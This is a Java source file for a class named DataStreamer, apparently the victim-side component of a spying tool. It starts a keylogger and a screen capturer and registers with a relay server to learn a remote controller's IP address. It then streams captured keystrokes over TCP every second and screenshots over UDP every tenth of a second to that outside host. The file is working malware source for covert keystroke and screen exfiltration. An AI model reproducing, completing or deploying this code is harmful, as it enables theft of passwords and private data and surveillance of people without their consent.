package model.program;

import model.connection.*;

import java.awt.*;
import java.io.IOException;
import java.io.OutputStream;

import static java.lang.Thread.sleep;

public class DataStreamer {



    // KeyLogger program,
    private KeyLogger Logger;
    // ScreenShooter program.
    private ScreenShooter Shooter;
    // Sends KeyLog to client.
    private TCPServer TCPServer;
    // Sends ScreemShare to Client.
    private UDPServer UDPServer;
    // Client's IP.
    private String ClientIP,
            SessionName, Password;
    // Check if there's a bind to the client machine.
    private boolean IsConnected;



    // Construtctor.
    public DataStreamer(String sessionName, String passowrd)
            throws AWTException,
            IOException,
            InterruptedException {
        SessionName = sessionName;
        Password = passowrd;

        Logger = new KeyLogger();
        Shooter = new ScreenShooter();

        IsConnected = false;
        establishConnection();
    }



    // Establishes a link to client.
    private void establishConnection() throws IOException,
            InterruptedException {
        System.out.println("Trying to establish connection...");
        HalfManServer.sendServerData(SessionName, Password);

        while(!IsConnected) {
            IsConnected = HalfManServer.hasLink();
            if (IsConnected) {
                ClientIP = HalfManServer.getClientIP(SessionName, Password);
                TCPServer = new TCPServer(ClientIP);
                UDPServer = new UDPServer(ClientIP);
                return;
            }
            sleep(5000);
        }
        System.out.println("Connection established!");
    }

    // Runs the whole program.
    public void run(){
        Logger.startKeyLogger();

        Thread runLogSender = logSender();
        Thread runScreenSender = screenSender();

        runLogSender.start();
        runScreenSender.start();
    }

    // Creates a thread that tries to send, every second, the keylog.
    private Thread logSender() {
        return new Thread(() -> {
            while (true) {
                try {
                    if(validLog()) {
                        sendLog();
                        Logger.resetLog();
                    }
                    sleep(1000);
                } catch (IOException | InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        });
    }

    // Creates a thread that sends, every 0.1 seconds, a frame to client.
    private Thread screenSender() {
        return new Thread(()-> {
            while(true) {
                try {
                    byte[] screenshotBytes = Shooter.getframeBytes();
                    if (screenshotBytes.length < 65535) {
                        UDPServer.sendBytes(screenshotBytes);
                    }
                    sleep(100);
                } catch (IOException | InterruptedException e) {
                    throw new RuntimeException(e);
                }
            }
        });
    }

    // Validates KeyLog format for sending.
    private boolean validLog() {
        return Logger.getLog().length() >= 60;
    }

    // Sends KeyLog to client.
    private void sendLog() throws IOException {
        OutputStream out = this.TCPServer.getClientSocket().getOutputStream();
        out.write(Logger.getLog().getBytes());
    }

}
